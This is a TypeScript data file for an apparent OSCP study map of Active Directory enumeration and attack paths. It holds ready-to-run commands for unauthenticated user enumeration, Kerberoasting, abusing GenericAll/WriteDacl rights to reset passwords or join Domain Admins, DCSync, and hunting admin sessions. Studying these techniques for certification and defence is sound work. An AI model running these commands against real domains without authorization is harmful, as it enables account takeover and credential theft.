import type { OscpContent } from '@/types/oscp'

/** Phase: Active Directory enumeration. */
const adEnum: OscpContent = {
    nodes: [
        {
            id: 'ad-foothold',
            title: 'Foothold on a domain host',
            type: 'state',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'You have a shell (or domain creds) inside the domain. Build context: who am I, what groups, which DC, what users and computers exist. Then look for the shortest path to Domain Admin.',
            commands: [
                {
                    label: 'Domain context',
                    code: `whoami /groups
net user /domain; net group "Domain Admins" /domain
nltest /dclist:<domain>`,
                },
                {
                    label: 'whoami + DC locator',
                    code: `whoami /all
echo %USERDOMAIN% %LOGONSERVER%
nltest /dsgetdc:<domain>
ipconfig /all`,
                },
                {
                    label: 'Domain + forest trusts',
                    code: `nltest /domain_trusts /v
nltest /trusted_domains
# a trust = path to the parent/child domain (cross-domain attacks)`,
                },
            ],
            tags: ['ad', 'domain', 'foothold', 'context'],
        },
        {
            id: 'ad-null-enum',
            title: 'Unauthenticated domain enum',
            type: 'technique',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'Before creds: null-session and anonymous LDAP for the user list, RID cycling, and kerbrute to validate usernames. Description fields sometimes hold plaintext passwords.',
            commands: [
                {
                    label: 'Users without creds',
                    code: `enum4linux-ng -A <dc>
netexec smb <dc> -u '' -p '' --rid-brute
ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description
kerbrute userenum -d <domain> --dc <dc> users.txt`,
                },
                {
                    label: 'Shares + users via null',
                    code: `netexec smb <dc> -u '' -p '' --users --groups --shares
enum4linux-ng -A <dc>`,
                },
            ],
            tags: ['null-session', 'rid-brute', 'kerbrute', 'ldap', 'enum4linux'],
        },
        {
            id: 'powerview',
            title: 'PowerView / domain enum from shell',
            type: 'technique',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'With a domain shell, enumerate users, groups, SPNs, ACLs and where admins are logged on. Find-LocalAdminAccess shows hosts you already admin.',
            commands: [
                {
                    label: 'Key queries',
                    code: `Get-DomainUser -SPN | select samaccountname          # kerberoastable
Get-DomainUser -PreauthNotRequired                    # AS-REP roastable
Find-LocalAdminAccess
Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'}`,
                },
                {
                    label: 'Users / computers / shares',
                    code: `Get-DomainUser | select samaccountname,description,pwdlastset
Get-DomainComputer | select dnshostname,operatingsystem
Find-DomainShare`,
                },
                {
                    label: 'Native + PowerView quick wins',
                    code: `net user /domain
setspn -L <target>
PsLoggedOn.exe \\\\<target>
Find-DomainShare -CheckShareAccess
Convert-SidToName <sid>`,
                },
            ],
            tags: ['powerview', 'spn', 'acl', 'find-localadminaccess'],
        },
        {
            id: 'bloodhound',
            title: 'BloodHound / SharpHound',
            type: 'technique',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'Collect the graph, then let it compute the shortest path to Domain Admin. Each hop maps to a concrete attack: ACL abuse, Kerberoast, AS-REP, or an existing session.',
            commands: [
                {
                    label: 'Collect (from Kali with creds)',
                    code: 'bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c all',
                },
                {
                    label: 'SharpHound from a domain host',
                    code: `Import-Module .\\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix audit
# Kali: neo4j start && bloodhound  (zip the json)`,
                },
            ],
            references: [
                { label: 'BloodHound docs', url: 'https://bloodhound.readthedocs.io/' },
            ],
            tags: ['bloodhound', 'sharphound', 'shortest-path'],
        },
        {
            id: 'spn-enum',
            title: 'Service accounts with SPNs',
            type: 'finding',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'Accounts with a servicePrincipalName can be Kerberoasted - any domain user can request their TGS and crack it offline.',
            commands: [
                {
                    label: 'List SPNs',
                    code: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc>
setspn -T <domain> -Q */*
Get-DomainUser -SPN | select samaccountname,serviceprincipalname`,
                },
                {
                    label: 'Request TGS hashes',
                    code: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request
netexec ldap <dc> -u <user> -p <pass> --kerberoast kerberoast.txt`,
                },
            ],
            tags: ['spn', 'kerberoast', 'service-account'],
        },
        {
            id: 'acl-enum',
            title: 'Dangerous ACL / rights',
            type: 'finding',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'GenericAll/GenericWrite/WriteDacl over a user or group, or DS-Replication rights, are direct escalation. GenericAll on a user -> reset their password; DCSync rights -> dump every hash.',
            commands: [
                {
                    label: 'Find dangerous ACEs',
                    code: `Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword'}
# BloodHound: shortest path to DA, then inspect inbound ACLs`,
                },
                {
                    label: 'Abuse GenericAll / WriteDacl',
                    code: `# GenericAll on a user -> reset their password
net user <victim> <NewPass1!> /domain
# bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set password <victim> <NewPass1!>
# WriteDacl -> grant yourself DCSync, then secretsdump`,
                },
                {
                    label: 'GenericAll on a group -> add yourself',
                    code: `# GenericAll over a privileged group (e.g. Domain Admins) -> add a user:
net rpc group addmem "Domain Admins" <user> -U "<domain>/<you>%<pass>" -S <dc>
# or PowerView:
Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>`,
                },
            ],
            tags: ['acl', 'genericall', 'writedacl', 'dcsync-rights'],
        },
        {
            id: 'sessions-enum',
            title: 'Privileged session on a host',
            type: 'finding',
            phase: 'ad-enum',
            os: 'ad',
            description:
                'A Domain Admin (or other high-value user) is logged on to a machine you can reach. Compromise that machine, then steal their token or credentials.',
            commands: [
                {
                    label: 'Who is logged on',
                    code: `netexec smb <target> -u <user> -p <pass> --sessions
qwinsta /server:<target>
Get-NetSession -ComputerName <host>`,
                },
                {
                    label: 'Logged-on users across the subnet',
                    code: `netexec smb <target> -u <user> -p <pass> --loggedon-users
netexec smb <subnet>/24 -u <user> -p <pass> --sessions
query user /server:<target>`,
                },
            ],
            tags: ['sessions', 'hassession', 'token', 'logged-on'],
        },
    ],
    edges: [
        { from: 'ad-foothold', to: 'powerview', label: 'enumerate from the shell' },
        { from: 'ad-foothold', to: 'bloodhound', label: 'map the domain' },
        { from: 'ad-null-enum', to: 'user-list', label: 'user list built' },
        { from: 'ad-null-enum', to: 'creds-found', label: 'description-field password' },
        { from: 'ad-null-enum', to: 'ad-asrep-roast', label: 'PreauthNotRequired user' },
        { from: 'powerview', to: 'spn-enum', label: 'SPNs found' },
        { from: 'powerview', to: 'acl-enum', label: 'ACL abuse path' },
        { from: 'powerview', to: 'sessions-enum', label: 'admin session located' },
        { from: 'bloodhound', to: 'spn-enum', label: 'node = Kerberoastable' },
        { from: 'bloodhound', to: 'acl-enum', label: 'node = ACL abuse' },
        { from: 'bloodhound', to: 'ad-asrep-roast', label: 'node = AS-REP' },
        { from: 'bloodhound', to: 'sessions-enum', label: 'node = HasSession' },
        { from: 'spn-enum', to: 'kerberoast', label: 'request the TGS' },
        { from: 'acl-enum', to: 'force-change-password', label: 'GenericAll on a user' },
        { from: 'acl-enum', to: 'dcsync', label: 'DCSync rights' },        { from: 'acl-enum', to: 'domain-admin', label: 'GenericAll on a privileged group' },

        { from: 'sessions-enum', to: 'psexec-lateral', label: 'compromise that host' },
    ],
}

export default adEnum
